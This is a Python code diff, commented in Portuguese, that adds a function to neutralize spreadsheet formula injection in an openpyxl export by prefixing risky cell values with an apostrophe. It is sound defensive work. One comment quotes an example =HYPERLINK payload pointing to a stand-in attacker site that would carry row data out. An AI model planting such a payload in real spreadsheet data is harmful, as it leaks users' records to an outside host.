@@ -9,6 +9,36 @@ import io
 import openpyxl
 from openpyxl.styles import Alignment, Border, Font, PatternFill, Side
 
+# Caracteres que fazem o Excel (e o LibreOffice, e o Google Sheets) tratar o
+# conteudo de uma celula como FORMULA em vez de texto.
+#
+# Por que isso importa aqui: os dados exportados vem do cadastro, ou seja, de
+# quem digitou. Um campo "observacoes" com
+#
+#     =HYPERLINK("http://sitedoatacante/?d="&A1;"Clique")
+#
+# vira um link ativo na planilha que o contador abre, com o conteudo da linha
+# no endereco. Ha variantes piores, com DDE, que chegam a executar programa.
+#
+# O nome do ataque e "CSV injection", mas ele nao e do CSV: e de quem abre o
+# arquivo. Por isso a neutralizacao vale igual para XLSX.
+PREFIXOS_DE_FORMULA = ("=", "+", "-", "@", "\t", "\r")
+
+
+def neutralizar_formula(valor):
+    """
+    Impede que um texto do cadastro seja interpretado como formula.
+
+    Prefixa com apostrofo, que as planilhas leem como "isto e texto" e nao
+    exibem na celula. So mexe em `str`: numero e data seguem como estao, senao
+    todo valor negativo viraria texto e as somas parariam de funcionar.
+    """
+    if not isinstance(valor, str) or not valor:
+        return valor
+    if valor.startswith(PREFIXOS_DE_FORMULA):
+        return "'" + valor
+    return valor
+
 COR_CABECALHO = '2563EB'
 COR_BORDA = 'C0C0C0'
 LARGURA_MAX_CONTEUDO = 40
@@ -59,7 +89,11 @@ def construir_planilha(titulo, cabecalhos, campos, registros) -> io.BytesIO:
     registros = list(registros)
     for numero_linha, registro in enumerate(registros, start=2):
         for indice, campo in enumerate(campos, start=1):
-            celula = ws.cell(row=numero_linha, column=indice, value=registro.get(campo, ''))
+            celula = ws.cell(
+                row=numero_linha,
+                column=indice,
+                value=neutralizar_formula(registro.get(campo, '')),
+            )
             celula.font = _FONTE_CORPO
             celula.alignment = _ALINHAMENTO_CENTRAL
             celula.border = _BORDA_FINA
